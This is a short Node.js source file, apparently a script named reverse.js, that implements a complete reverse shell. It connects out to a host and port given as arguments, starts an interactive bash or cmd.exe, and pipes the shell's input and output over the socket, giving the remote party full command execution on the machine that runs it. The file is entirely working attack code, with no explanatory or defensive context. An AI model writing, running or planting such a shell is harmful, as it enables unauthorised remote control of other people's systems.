const net = require('net');
const { spawn } = require('child_process');

if (process.argv.length < 4) {
  console.error('Usage: node reverse.js <host> <port>');
  process.exit(1);
}

const host = process.argv[2];
const port = Number(process.argv[3]);

const client = net.createConnection({ host, port }, () => {
  const shellPath = process.platform === 'win32' ? 'cmd.exe' : '/bin/bash';
  const shellArgs = process.platform === 'win32' ? [] : ['-i'];

  const shell = spawn(shellPath, shellArgs, {
    stdio: ['pipe', 'pipe', 'pipe']
  });

  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  client.pipe(shell.stdin);

  shell.on('exit', () => client.end());
  client.on('end', () => shell.kill());
  client.on('error', () => shell.kill());
});